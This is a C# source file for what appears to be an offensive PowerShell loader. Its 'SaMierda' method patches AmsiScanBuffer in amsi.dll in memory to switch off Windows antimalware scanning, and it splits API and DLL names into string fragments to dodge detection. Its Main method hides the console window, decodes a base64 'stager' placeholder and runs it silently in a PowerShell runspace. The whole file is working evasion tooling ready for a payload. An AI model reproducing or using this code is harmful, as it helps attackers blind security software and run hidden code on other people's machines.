/*
 * 
 * You may compile this in Visual Studio or SharpDevelop etc.
 * 
 * 
 * 
 * 
 */
using System;
using System.Text;
using System.Management.Automation; 
using System.Management.Automation.Runspaces; 
using System.Runtime.InteropServices;

namespace cmd
{
    public class Mata 
    {
        [DllImport("kern"+"el32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kern"+"el32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kern"+"el32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("Kern"+"el32.dll", EntryPoint = "Rtl" + "Move" + "Memory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);
        public static int SaMierda() 
        {
            IntPtr TargetDLL = LoadLibrary("a" + "ms" + "i." + "dll");
            if (TargetDLL == IntPtr.Zero) { return 1; }
            IntPtr WootPtr = GetProcAddress(TargetDLL, "Am" + "si" + "Scan" + "Buf" + "fer");
            if (WootPtr == IntPtr.Zero) { return 1; }
            UIntPtr dwSize = (UIntPtr)5;
            uint Zero = 0;
            if (!VirtualProtect(WootPtr, dwSize, 0x40, out Zero)) { return 1; }
            Byte[] Patch = { 0x31, 0xff, 0x90 };
            IntPtr unmanagedPointer = Marshal.AllocHGlobal(3);
            Marshal.Copy(Patch, 0, unmanagedPointer, 3);
            MoveMemory(WootPtr + 0x001b, unmanagedPointer, 3);
            return 0;
        }
    }

    class Program
    {
        [DllImport("kern"+"el32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user"+"32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        public static void Main(string[] args)
        {
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);
            string stager = " YOUR CODE GOES HERE";
            var decodedScript = Encoding.Unicode.GetString(Convert.FromBase64String(stager));

            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);
            Pipeline pipeline = runspace.CreatePipeline();

            pipeline.Commands.AddScript(decodedScript);

            pipeline.Commands.Add("Out-String");
            pipeline.Invoke();
        }
    }
}
